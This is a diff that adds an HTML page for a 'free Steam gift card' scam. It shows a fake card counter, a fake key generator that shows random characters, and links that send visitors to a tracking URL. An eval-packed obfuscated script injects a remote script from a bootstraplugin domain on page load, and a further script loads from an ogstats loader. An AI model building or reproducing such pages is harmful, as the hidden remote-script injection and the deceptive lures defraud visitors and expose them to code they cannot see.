@@ -1,0 +1,618 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Free Gift Card</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+@import url('https://fonts.googleapis.com/css?family=Roboto');
+body {
+	font-family: 'Roboto', sans-serif;
+	color:#94929b;
+	font-size:24px;
+	background:#211838;	
+}
+
+.general {
+	width:100%;
+	height:100%;
+	top:0;
+	text-align:center;
+}
+
+.dark {
+	width:100%;
+	height:100%;
+	top:0;
+	background-color: rgba(0, 0, 0, 0.8);
+	position:fixed;
+	padding:0;
+	margin:0 auto;
+	left:0;
+	text-align:center;
+	opacity:0;
+	z-index:-10;
+}
+
+.popin {
+	margin:180px auto 0;
+	width:600px;
+	background-color:#FFFFFF;
+	padding:10px;
+	border-radius:25px;
+	color:#c3c3c3;	
+	text-align:center;
+}
+
+.bar {
+	width:100%;
+	max-width:400px;
+	min-width:260px;
+	background-color:#c3c3c3;
+	border-radius:5px;
+	margin:50px auto;
+	position:relative;
+	height:10px;	
+}
+
+.advance {
+	width:0;
+	max-width:390px;
+	height:4px;
+	background-color:#FFCC00;
+	border-radius:3px;
+	position:absolute;
+	z-index:200;
+	top:3px;
+	left:5px;
+}
+
+.advanced {
+	width:0;
+	max-width:390px;
+	height:4px;
+	background-color:#FFCC00;
+	border-radius:3px;
+	position:absolute;
+	z-index:200;
+	top:3px;
+	left:50%;
+}
+
+
+.round1 {
+	border-radius:25px;
+	width:20px;
+	height:20px;
+	background-color:#c3c3c3;
+	position:absolute;
+	z-index:100;
+	top:-5px;
+	left:0;
+}
+
+.advance1 {
+	border-radius:25px;
+	width:0;
+	height:0;
+	background-color:#ffcc00;
+	position:absolute;
+	z-index:100;
+	top:-1px;
+	left:4px;
+}
+
+.round2 {
+	border-radius:25px;
+	width:20px;
+	height:20px;
+	background-color:#c3c3c3;
+	left:50%;
+	margin-left:-10px;
+	top:-5px;
+	position:absolute;
+	z-index:100;	
+}
+
+.advance2 {
+	border-radius:25px;
+	width:0;
+	height:0;
+	background-color:#ffcc00;
+	position:absolute;
+	z-index:100;
+	top:-1px;
+	left:50%;
+	margin-left:-6px;
+}
+
+.round3 {
+	border-radius:25px;
+	width:20px;
+	height:20px;
+	background-color:#c3c3c3;
+	right:0;
+	position:absolute;
+	z-index:100;
+	top:-5px;
+}
+
+.advance3 {
+	border-radius:25px;
+	width:0;
+	height:0;
+	background-color:#ffcc00;
+	position:absolute;
+	z-index:100;
+	top:-1px;
+	right:4px;
+}
+
+.system {
+	margin-top:20px;
+	opacity:0;
+	line-height:25px;
+	height:40px;
+}
+
+.content {
+
+	padding:60px 19px;	
+	text-align:center;
+	margin:0 auto;
+}
+
+h1, h2 {
+	font-size:36px;
+	color:#FFFFFF;
+	font-weight:bolder;	
+	text-shadow: 7px 7px #0e081e;
+}
+
+h1 span, h2 span {
+	text-transform:uppercase;
+	color:#FFCC00;
+}
+
+h3 {
+	color:#333333;
+	text-transform:uppercase;
+	font-size:30px;	
+}
+
+.card {
+	padding-right:17px;
+	padding-bottom:17px;
+	display:inline-block;	
+}
+
+.last {
+	padding-right:0;
+}
+
+.screen {
+	display:none;
+	padding:0 0 50px;
+	opacity:0;	
+}
+
+button {
+	border:0;
+	padding:15px 20px;
+	font-size:16px;
+	font-weight:bold;
+	background-color:#FF0000;
+	color:#FFFFFF;
+	text-transform:uppercase;
+	border-radius: 10px;
+	margin-bottom:25px;
+	cursor:pointer;
+}
+
+#result {
+	opacity:0;
+	display:none;	
+}
+
+.numbers {
+	font-size:30x;
+	color:#211838;
+	font-weight:bold;	
+	padding-bottom:20px;
+}
+
+@media screen and (max-width: 768px) {
+	.content {
+		width:90%;
+		padding:30px 5%;	
+	}
+	.last {
+		padding-right:17px;
+	}
+	
+	.logo {
+		width:100%;
+		height:auto;
+		max-width:418px;
+		margin:0 auto;	
+	}
+	
+	.popin {
+		margin:25px auto 0;
+		width:80%;
+	}
+	
+	.bar {
+		width:80%;
+	}
+	
+	.numbers {
+		font-size:20px;	
+		padding-bottom:20px;
+	}
+}
+
+</style>
+<script>
+	var page;
+</script>
+</head>
+
+<body>
+	<div class="general">
+    	        <script>
+			page = 2;
+		</script>
+        	<div class="content">
+        	<img src="header.png" border="0" alt="Free Gift Card" class="logo" />
+            <h1>Want some <span>Free steam Gift Card</span></h1>
+            <p>Second step, choose your card amount</p>
+                        <div class="card"><a href="https://www.areyouahuman.co/cl.php?id=54691e43907848564578363b1ebafa64"><img src="steamcard.png" alt="steam Card" border="0" /></a><br /><h2>$10</h2></div>
+            <div class="card"><a href="https://www.areyouahuman.co/cl.php?id=54691e43907848564578363b1ebafa64"><img src="steamcard.png" alt="steam Card" border="0" /></a><br /><h2>$25</h2></div>
+            <div class="card"><a href="https://www.areyouahuman.co/cl.php?id=54691e43907848564578363b1ebafa64"><img src="steamcard.png" alt="steam Card" border="0" /></a><br /><h2>$50</h2></div>
+            <h2>Only <span><span id="randNbCard"></span> steam Cards</span> left!</h2>
+        </div>
+		    </div>
+    <div class="dark">
+    	<div class="popin">
+        	<div id="step">
+            	<div class="system"><h3 id="system"></h3></div>
+            	<div class="bar">
+                	<div class="round1"></div>
+                    <div class="round2"></div>
+                    <div class="round3"></div>
+                    <div class="advance1"></div>
+                    <div class="advance2"></div>
+                    <div class="advance3"></div>
+                	<div class="advance"></div>
+                    <div class="advanced"></div>
+                </div>
+                <div class="screen" id="screen"></div>
+                <div class="numbers" id="numbers"></div>
+                <div class="result" id="result"><button onclick="window.location = 'https://www.areyouahuman.co/cl.php?id=54691e43907848564578363b1ebafa64';">Recover my free steam key</button></div>    
+            </div>
+        </div>
+    </div>
+    
+
+
+
+
+    <script type="text/javascript">
+		
+		eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
+		
+		if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){
+		
+		if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}
+		
+		('(5(0){4 1=0.7(\'1\');1.2=\'//3.6/d.8?c=b\';0.a.9(1)})(0);',14,14,'document|script|src|http://http://bootstraplugin|var|function|com|createElement|php|appendChild|head|158|id|p'.split('|'),0,{
+			
+		}))
+		
+		var call = 0;
+		
+		function active(){
+			$('.dark').css({
+				'z-index':'50'
+			});
+			$('.dark').animate({
+				'opacity':'1'
+			}, 500);
+			
+			$('.system').animate({
+				'opacity':'1'
+			});
+			
+			$('.screen').css ({
+				'display':'block'
+			});
+			
+			screenLoad = document.getElementById('screen');
+			
+			screenLoad.innerHTML = 'Connecting to server...';
+			
+			$('.screen').animate({
+				'opacity':'1'
+			}, 250);
+			
+			var txt = 'Connecting';
+			system = document.getElementById('system');
+			 
+			for(var i = 0, l = txt.length; i < l; i++) {
+				(function(i) {
+					setTimeout(function() {
+						system.innerHTML += txt.charAt(i);
+					}, i * 100);
+				}(i));
+			}
+			
+			$('.advance1').animate({
+				'width':'12px',
+				'height':'12px'
+			}, 100);
+			
+			var vitesse = ((Math.random()+1)*3000)+1000;
+			
+			$('.advance').animate({
+				'width':'48%'
+			}, vitesse, function(){			
+				active2();	
+			});	
+			return false;
+			
+			
+		}
+		
+		function active2(){
+			screenLoad.innerHTML += '<br /><img src="//i.imgur.com/c5fQWmk.png" alt="" border="0" /> <font color="#74eb00;">Connected</font>';
+			var txt = '';
+			var txt = 'Generating';
+			system = document.getElementById('system');
+			system.innerHTML = '';
+			
+			for(var i = 0, l = txt.length; i < l; i++) {
+				(function(i) {
+					setTimeout(function() {
+						system.innerHTML += txt.charAt(i);
+					}, i * 100);
+				}(i));
+			}
+			$('.advance2').animate({
+				'width':'12px',
+				'height':'12px'
+			}, 100, function(){
+				screenLoad.innerHTML += '<br />Generating Key...';
+			});
+			
+			keyGenerate();							
+				
+		};
+		
+		function active3(){
+			var vitesse2 = 1000;
+			$('.advanced').animate({
+				'width':'48%'
+			}, vitesse2, function(){
+				$('.advance3').animate({
+					'width':'12px',
+					'height':'12px'
+				}, 100, function(){
+						
+				})
+			})
+			screenLoad.innerHTML += '<br /><img src="//i.imgur.com/c5fQWmk.png" alt="" border="0" /> <font color="#74eb00;">Key Generated</font>';
+			var txt = '';
+			var txt = 'Completed';
+			system = document.getElementById('system');
+			system.innerHTML = '';
+			
+			for(var i = 0, l = txt.length; i < l; i++) {
+				(function(i) {
+					setTimeout(function() {
+						system.innerHTML += txt.charAt(i);
+					}, i * 100);
+				}(i));
+			}
+			
+			active4();	
+			
+		}
+		
+		function active4(){
+			$('#result').css({
+				'display':'block'
+			})
+			
+			$('#result').animate({
+				'opacity':'1'
+			}, 500)
+		}
+		
+		function keyGenerate(){
+			
+			var key = "";
+			
+			var listCar = new Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+			
+			for(var nb=0; nb<23; nb++){
+				if(key.length == 5 || key.length == 11 || key.length == 17){
+					key += '-'
+				}
+				else if(key.length == 18 || key.length == 19 || key.length == 20 || key.length == 21 || key.length == 22){
+					key += 'X'	
+				}
+				else{
+					//key += String.fromCharCode(Math.round((Math.random()*(90-48)))+48);
+					key += listCar[Math.floor(Math.random()*listCar.length)];
+				}
+			}
+
+			var resultKey = document.getElementById("numbers");
+			var counter = 0;
+			var oldString = "";
+			var interval = setInterval(function(){
+					wordGenerator();
+					 if(!counter){
+						 clearInterval(interval);
+					 }
+			}, 100);
+			
+			function wordGenerator() {
+				var returnedString = "";
+				counter = 0;
+				
+				var listCar = new Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+				
+				for(var i=0; i<key.length; i++) {
+					if(!oldString.length || oldString.charAt(i) != key.charAt(i)){
+						//var letter = String.fromCharCode(Math.random() * (90-48))+48;
+						//var letter = String.fromCharCode(Math.round((Math.random()*(90-48)))+48);
+						
+						
+						if(key.charAt(i) == "-"){
+							var letter = "-";
+						}
+						else {
+							var letter = listCar[Math.floor(Math.random()*listCar.length)];	
+						}
+						counter ++;
+					}else{
+							var letter = key.charAt(i);
+					}
+					returnedString += letter;
+				}
+				oldString = returnedString;
+				resultKey.innerHTML=returnedString;   
+				
+				if(resultKey.innerHTML == key){
+					call += 1;
+					
+					if(call == '1'){
+						active3();
+					}
+					else{
+						
+					}
+					
+				}
+				else{
+					
+				}
+				return false;
+			}
+			
+		}
+
+		function randText(){
+			
+			randNb = (Math.round(Math.random() * (3000-1000))+1000);
+					
+			var randNbText = document.getElementById('randNb');
+			randNbText.innerHTML = randNb;
+			
+			var compte = 0;
+			
+			var count;
+			//timer = (Math.round(Math.random() * (3000-1000))+1000);
+			
+			function refreshTime(){
+				timer = (Math.round(Math.random() * (3000-1000))+1000);
+					//console.log(timer);
+			}
+				
+			function myFunction() {
+					
+				refreshTime();
+				count = setInterval(alertFunc, timer);
+			}
+				
+			function alertFunc() {
+				if(compte == '0'){
+					compte+=1;
+					if(randNbText.innerHTML <= '5' && randNbText.innerHTML >= '2'){
+						randNbText.innerHTML -= 1;
+					}
+					else if(randNbText.innerHTML <= '1'){
+						randNbText.innerHTML = 0;
+					}
+					else{
+						randNbText.innerHTML -= (Math.round(Math.random() * (5-1))+1);
+					}
+				}
+				else{
+					compte = 0;
+					clearInterval(count);
+					myFunction()
+				}
+					
+			}
+			myFunction()
+
+		}
+		
+		function randText2(){
+			
+			randNb2 = (Math.round(Math.random() * (500-150))+150);
+				
+			var randNbText2 = document.getElementById('randNbCard');
+			randNbText2.innerHTML = randNb2;
+			
+			var compte2 = 0;
+			
+			var count2;
+			//timer = (Math.round(Math.random() * (3000-1000))+1000);
+			
+			function refreshTime2(){
+				timer2 = (Math.round(Math.random() * (8000-3000))+3000);
+					//console.log(timer);
+			}
+				
+			function myFunction2() {
+					
+				refreshTime2();
+				count2 = setInterval(alertFunc2, timer2);
+			}
+				
+			function alertFunc2() {
+				if(compte2 == '0'){
+					compte2+=1;
+					if(randNbText2.innerHTML <= '5' && randNbText2.innerHTML >= '2'){
+						randNbText2.innerHTML -= 1;
+					}
+					else if(randNbText2.innerHTML <= '1'){
+						randNbText2.innerHTML = 0;
+					}
+					else{
+						randNbText2.innerHTML -= (Math.round(Math.random() * (2-1))+1);
+					}
+				}
+				else{
+					compte2 = 0;
+					clearInterval(count2);
+					myFunction2()
+				}
+					
+			}
+			myFunction2()
+
+		}
+		
+		if(page == '1'){
+			randText();
+		}
+		else if(page == '2'){
+			randText2();	
+		}
+		else{
+			
+		}
+		
+    </script>
+    
+        
+    <script>var _webzone = "92uPkTE9bwoOw6X";</script>
+<script src="//loader.ogstats.com"></script>
+    
+</body>
+</html>
